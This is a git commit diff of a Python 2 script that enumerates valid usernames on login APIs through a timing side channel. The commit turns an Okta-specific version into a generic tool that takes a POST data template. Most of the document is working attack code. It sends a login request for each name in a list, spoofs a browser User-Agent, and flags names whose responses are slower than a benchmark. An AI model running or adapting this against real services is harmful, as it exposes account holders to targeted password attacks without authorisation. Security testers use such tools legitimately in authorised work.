55cfcd0ad91dfe2c62fd20f8f082e90a23d4c7f1
Mr.Un1k0d3r <Mr.Un1k0d3r@gmail.com>
2018-05-31 14:19:27 -0400

    Updating script

--- sidechannel.py
+++ sidechannel.py
@@ -3,7 +3,7 @@ import time
 import sys
 import os
 
-def get_response_delay(url, username):
+def get_response_delay(url, data, username):
 	request = urllib2.Request(url)
 	request.add_header("Content-Type", "application/json;charset=utf-8")
 	request.add_header("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0")
@@ -11,7 +11,7 @@ def get_response_delay(url, username):
 	request.add_header("Origin",url)
 	start = time.time()
 	try:
-		response = urllib2.urlopen(request, '{"username":"%s","password":"********","relayState":"/","options":{"multiOptionalFactorEnroll":false,"warnBeforePasswordExpired":false}}' % username)
+		response = urllib2.urlopen(request, data % username)
 	except:
 		pass
 		
@@ -19,14 +19,15 @@ def get_response_delay(url, username):
 	return delay
 
 if __name__ == "__main__":
-	print "OKTA Side Channel User Enumeration\nMr.Un1k0d3r RingZer0 Team 2017\n\n"
+	print "Generic Side Channel User Enumeration\nMr.Un1k0d3r RingZer0 Team 2017\n\n"
 	
-	if len(sys.argv) < 5:
-		print "Usage: python %s [url] [valid_user] [path] [delay]\n" % sys.argv[0]
-		print "\tUrl        Full url to the authn API (/api/v1/authn)"
+	if len(sys.argv) < 6:
+		print "Usage: python %s [url] [valid_user] [path] [delay] [data]\n" % sys.argv[0]
+		print "\tUrl        Full url to the API (http://url.com/api/v1/...)"
 		print "\tValid User Valid user to benchmark the delay"
 		print "\tPath       Path to a list of username"
-		print "\tDelay      Maximum delay difference around 0.010 should be good"
+		print "\tDelay      Delay used for benchmark (milliseconds) Ex: 0.1"
+		print "\tData       Post data (%s need to be placed instead of the username)"
 		sys.exit(0)
 
 	url = sys.argv[1]
@@ -34,12 +35,13 @@ if __name__ == "__main__":
 
 	filepath = sys.argv[3]
 	delay = float(sys.argv[4])
+	data = sys.argv[5]
 
 	if not os.path.exists(filepath):
 		print "[-] %s not found" % filepath
 		sys.exit(0)
 
-	benchmark = get_response_delay(url, username)
+	benchmark = get_response_delay(url, data, username)
 	
 	print "[+] Valid user benchmark is %f" % benchmark
 	print "[+] Everything slower than %f will be considered valid" % float(benchmark - delay)
